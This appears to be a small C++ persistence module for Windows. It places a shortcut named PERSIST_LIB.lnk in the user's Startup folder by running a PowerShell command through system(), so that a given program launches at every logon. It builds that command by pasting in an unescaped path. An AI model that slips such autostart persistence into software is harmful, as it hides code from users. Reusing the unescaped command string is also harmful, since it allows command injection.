#include "persistence.hpp"
#include <cstdlib>
#include <shlobj.h>

static std::string get_startup_path(void)
{
    char path[MAX_PATH];

    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path);

    return std::string(path);
}

bool startup_install(const std::string& path)
{
    std::string startup = get_startup_path();

    std::string cmd =
        "cmd /c powershell \"$s=(New-Object -COM WScript.Shell).CreateShortcut('"
        + startup + "\\PERSIST_LIB.lnk');"
        "$s.TargetPath='" + path + "';$s.Save()\"";

    return (system(cmd.c_str()) == 0);
}